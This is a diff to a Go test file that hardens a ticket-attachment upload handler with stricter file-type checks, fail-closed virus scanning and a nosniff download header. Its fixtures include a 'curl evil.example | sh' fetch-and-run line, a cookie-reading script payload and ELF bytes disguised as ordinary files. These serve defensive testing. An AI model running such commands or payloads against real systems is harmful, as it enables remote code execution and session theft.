@@ -11,6 +11,7 @@ import (
 	"net/textproto"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"testing"
 
@@ -72,6 +73,14 @@ func (f *attachmentUploadFakeStore) AddTicketAttachment(a *models.TicketAttachme
 func (f *attachmentUploadFakeStore) InsertTicketAudit(ev *models.TicketAuditEvent) error {
 	f.auditEvents++
 	return nil
+}
+func (f *attachmentUploadFakeStore) GetTicketAttachment(id int) (*models.TicketAttachment, error) {
+	for _, a := range f.attachments {
+		if a.ID == id {
+			return a, nil
+		}
+	}
+	return nil, nil
 }
 
 // recordingScanner counts invocations and records the exact bytes it was
@@ -180,6 +189,20 @@ func pngBytes(padTo int) []byte {
 	return out
 }
 
+// ustarHeaderBytes builds a genuinely-shaped 512-byte POSIX ustar header
+// block: an ASCII filename in the name field (offset 0) and the real
+// "ustar\000" magic at its fixed offset (257) - what attachmentAllowed's
+// .tar check actually looks for. Go's DetectContentType has no tar
+// signature, so this (like a real tar file) sniffs as
+// application/octet-stream; only the ustar magic at offset 257 tells it
+// apart from an ELF/PE payload padded to the same length.
+func ustarHeaderBytes(name string) []byte {
+	b := make([]byte, 512)
+	copy(b, name)
+	copy(b[257:], "ustar\x0000")
+	return b
+}
+
 // TestUploadAttachment_AcceptedTypes covers the default allowlist end to end
 // through the real handler: each case's declared MIME and byte content agree
 // with what the extension permits, so every one must be stored successfully.
@@ -190,10 +213,11 @@ func TestUploadAttachment_AcceptedTypes(t *testing.T) {
 	pdfBytes := []byte("%PDF-1.7\n%some pdf content\n")
 	zipBytes := []byte("PK\x03\x04" + strings.Repeat("z", 20))
 	gzBytes := []byte{0x1F, 0x8B, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00}
-	// Realistic-shaped tar: an ASCII filename followed by NUL padding (as a
-	// real ustar header block is), which sniffs as application/octet-stream
-	// since Go's DetectContentType has no dedicated tar signature.
-	tarBytes := append([]byte("myfile.txt"), make([]byte, 502)...)
+	// Genuine ustar header block (see ustarHeaderBytes) - the .tar check
+	// requires the real "ustar" magic at offset 257 since Fix 1 (a bare
+	// NUL-padded blob with no magic, or an ELF/PE padded to the same length,
+	// must now be rejected - see TestUploadAttachment_RejectedTypes).
+	tarBytes := ustarHeaderBytes("myfile.txt")
 	jsonBytes := []byte(`{"key":"value"}`)
 
 	cases := []struct {
@@ -231,12 +255,21 @@ func TestUploadAttachment_AcceptedTypes(t *testing.T) {
 }
 
 // TestUploadAttachment_RejectedTypes covers the reject paths: a disallowed
-// extension, a declared-vs-sniff mismatch, and an executable/script
-// disguised under an allowed extension. Every case must both come back
-// 415 AND leave no stored object / no DB row behind.
+// extension, an extension-vs-sniff mismatch, and an executable/script
+// disguised under an allowed extension - including the adversarial gaps Fix
+// 1/2 closed (an ELF or shell script previously slipping through the loose
+// text/application families, and an HTML body riding in under a .txt name).
+// Every case must both come back 415 AND leave no stored object / no DB row
+// behind.
 func TestUploadAttachment_RejectedTypes(t *testing.T) {
 	elfBytes := []byte{0x7f, 'E', 'L', 'F', 0x02, 0x01, 0x01, 0x00}
+	// ELF padded to a full 512 bytes with zero bytes (no ustar magic at
+	// offset 257) - proves the .tar rejection comes from the missing magic,
+	// not merely from the payload being short.
+	elfPadded512 := append(append([]byte{}, elfBytes...), make([]byte, 512-len(elfBytes))...)
 	shellScript := []byte("#!/bin/sh\ncurl evil.example | sh\n")
+	notGzip := []byte("this is not a gzip file at all, just plain text\n")
+	htmlScript := []byte("<script>alert(document.cookie)</script>")
 	png := pngBytes(600)
 
 	cases := []struct {
@@ -247,9 +280,26 @@ func TestUploadAttachment_RejectedTypes(t *testing.T) {
 	}{
 		{"disallowed extension (.exe)", "totally-a-photo.exe", "application/octet-stream", elfBytes},
 		{"disallowed extension (.sh) despite image header", "evil.sh", "image/png", png},
-		{"declared-vs-sniff mismatch: .png named, ELF bytes", "sneaky.png", "image/png", elfBytes},
+		{"extension-vs-sniff mismatch: .png named, ELF bytes", "sneaky.png", "image/png", elfBytes},
 		{"script disguised as .jpg", "vacation.jpg", "image/jpeg", shellScript},
 		{"no extension", "README", "text/plain", []byte("hi\n")},
+		// Fix 1: family "text" (.txt/.log/.json) no longer accepts the
+		// application/octet-stream fallback, so a raw ELF payload sniffing
+		// as octet-stream is rejected under every text-family extension.
+		{"ELF disguised as .txt", "payload.txt", "text/plain", elfBytes},
+		{"ELF disguised as .log", "payload.log", "text/plain", elfBytes},
+		{"ELF disguised as .json", "payload.json", "application/json", elfBytes},
+		// Fix 1: .tar now requires the real ustar magic, not just an
+		// application/* sniff (which octet-stream satisfies too).
+		{"ELF disguised as .tar", "payload.tar", "application/x-tar", elfPadded512},
+		// Fix 1: .gz now requires the real gzip magic bytes, not a loose
+		// application/*-or-text/plain sniff.
+		{"shell script disguised as .gz", "payload.gz", "application/gzip", shellScript},
+		{"non-gzip body rejected as .gz (fails the magic check)", "payload.gz", "application/gzip", notGzip},
+		// Fix 2: family "text" also excludes text/html now, so an HTML/script
+		// body cannot ride in under a harmless .txt filename and later be
+		// reflected as Content-Type: text/html on download.
+		{"HTML/script body disguised as .txt", "notes.txt", "text/html", htmlScript},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
@@ -369,9 +419,13 @@ func TestUploadAttachment_ScannerEnabledClean(t *testing.T) {
 }
 
 // TestUploadAttachment_ScannerEnabledHit asserts a scanner-reported virus
-// hit rejects the upload and leaves no stored object / no DB row.
+// hit rejects the upload with 415 and leaves no stored object / no DB row.
+// The scanner wraps errScanHit, exactly as clamdScanner does on a real
+// "FOUND" reply - this is what UploadAttachment uses (via errors.Is) to tell
+// a genuine hit apart from an infrastructure failure (see the
+// InfraErrorFailsClosed test below, which must return 503 instead).
 func TestUploadAttachment_ScannerEnabledHit(t *testing.T) {
-	scanner := &recordingScanner{err: fmt.Errorf("attachment rejected by virus scan: Eicar-Test-Signature FOUND")}
+	scanner := &recordingScanner{err: fmt.Errorf("%w: Eicar-Test-Signature FOUND", errScanHit)}
 	h, fs, dir := newAttachmentUploadHandler(t, nil, scanner)
 
 	rw := httptest.NewRecorder()
@@ -394,22 +448,85 @@ func TestUploadAttachment_ScannerEnabledHit(t *testing.T) {
 // fail-closed decision (task-7-report.md): when scanning is enabled but the
 // scanner itself errors out (e.g. clamd unreachable) rather than reporting a
 // clean/infected verdict, the upload must still be REJECTED, not silently
-// let through unscanned. This is deliberately a distinct test from the
-// "hit" case above even though the code path is the same, so the decision
-// is pinned by name and cannot regress silently.
+// let through unscanned - but as a distinct HTTP status (503, a server-side
+// condition) from a genuine hit (415, a client-content problem), and the
+// response body must be a fixed generic message that does NOT leak the raw
+// scanner error (which here contains an internal host:port). This is
+// deliberately a distinct test from the "hit" case above even though the
+// upload is rejected in both, so both the status split and the info-leak fix
+// are pinned by name and cannot regress silently.
 func TestUploadAttachment_ScannerEnabledInfraErrorFailsClosed(t *testing.T) {
-	scanner := &recordingScanner{err: fmt.Errorf("clamav dial: dial tcp 127.0.0.1:3310: connect: connection refused")}
+	const internalAddr = "10.0.0.7:3310"
+	scanner := &recordingScanner{err: fmt.Errorf("clamav dial: dial tcp %s: connect: connection refused", internalAddr)}
 	h, fs, dir := newAttachmentUploadHandler(t, nil, scanner)
 
 	rw := httptest.NewRecorder()
 	h.UploadAttachment(rw, newAttachmentUploadRequest(t, "logo.png", "image/png", pngBytes(600)))
-	if rw.Code != http.StatusUnsupportedMediaType {
-		t.Fatalf("status = %d, want 415 (fail-closed on scanner infra error) (%s)", rw.Code, rw.Body.String())
+	if rw.Code != http.StatusServiceUnavailable {
+		t.Fatalf("status = %d, want 503 (fail-closed on scanner infra error, server-side status) (%s)", rw.Code, rw.Body.String())
+	}
+	if strings.Contains(rw.Body.String(), internalAddr) {
+		t.Fatalf("response body leaks the internal scanner address: %s", rw.Body.String())
+	}
+	if strings.Contains(rw.Body.String(), "connection refused") {
+		t.Fatalf("response body leaks the raw scanner error: %s", rw.Body.String())
 	}
 	if len(fs.attachments) != 0 {
 		t.Fatalf("attachments persisted = %d, want 0", len(fs.attachments))
 	}
 	if n := countStoredFiles(t, dir); n != 0 {
 		t.Fatalf("stored files = %d, want 0", n)
+	}
+}
+
+// TestUploadAttachment_StoredMimeIsSniffedNotDeclared pins Fix 2: the
+// persisted Mime is always what http.DetectContentType actually saw, never
+// the client's declared Content-Type header. Uploads a real PNG while
+// declaring text/html (the exact shape of the reported gap: a client can
+// claim any Content-Type it likes) and asserts the stored Mime is the
+// sniffed image type, not the declared one.
+func TestUploadAttachment_StoredMimeIsSniffedNotDeclared(t *testing.T) {
+	h, fs, _ := newAttachmentUploadHandler(t, nil, nil)
+	rw := httptest.NewRecorder()
+	h.UploadAttachment(rw, newAttachmentUploadRequest(t, "logo.png", "text/html", pngBytes(600)))
+	if rw.Code != http.StatusOK {
+		t.Fatalf("status = %d, want 200 (%s)", rw.Code, rw.Body.String())
+	}
+	if len(fs.attachments) != 1 {
+		t.Fatalf("attachments persisted = %d, want 1", len(fs.attachments))
+	}
+	if got := fs.attachments[0].Mime; !strings.HasPrefix(got, "image/") {
+		t.Fatalf("stored Mime = %q, want the sniffed image/* type - the declared text/html must never be persisted", got)
+	}
+}
+
+// TestDownloadAttachment_NoSniffHeader pins Fix 2's second half: the download
+// response always carries X-Content-Type-Options: nosniff, so a browser
+// cannot content-sniff a stored file into something more dangerous than its
+// (now sniff-derived) Content-Type - defence in depth alongside
+// Content-Disposition: attachment.
+func TestDownloadAttachment_NoSniffHeader(t *testing.T) {
+	h, fs, _ := newAttachmentUploadHandler(t, nil, nil)
+	uploadRW := httptest.NewRecorder()
+	h.UploadAttachment(uploadRW, newAttachmentUploadRequest(t, "logo.png", "image/png", pngBytes(600)))
+	if uploadRW.Code != http.StatusOK {
+		t.Fatalf("upload status = %d, want 200 (%s)", uploadRW.Code, uploadRW.Body.String())
+	}
+	if len(fs.attachments) != 1 {
+		t.Fatalf("attachments persisted = %d, want 1", len(fs.attachments))
+	}
+	aid := fs.attachments[0].ID
+
+	req := httptest.NewRequest(http.MethodGet, fmt.Sprintf("/api/tickets/1/attachments/%d/download", aid), nil)
+	req = req.WithContext(context.WithValue(req.Context(), "userID", testTicketOwner))
+	req = mux.SetURLVars(req, map[string]string{"id": "1", "aid": strconv.Itoa(aid)})
+
+	rw := httptest.NewRecorder()
+	h.DownloadAttachment(rw, req)
+	if rw.Code != http.StatusOK {
+		t.Fatalf("download status = %d, want 200 (%s)", rw.Code, rw.Body.String())
+	}
+	if got := rw.Header().Get("X-Content-Type-Options"); got != "nosniff" {
+		t.Fatalf("X-Content-Type-Options = %q, want %q", got, "nosniff")
 	}
 }
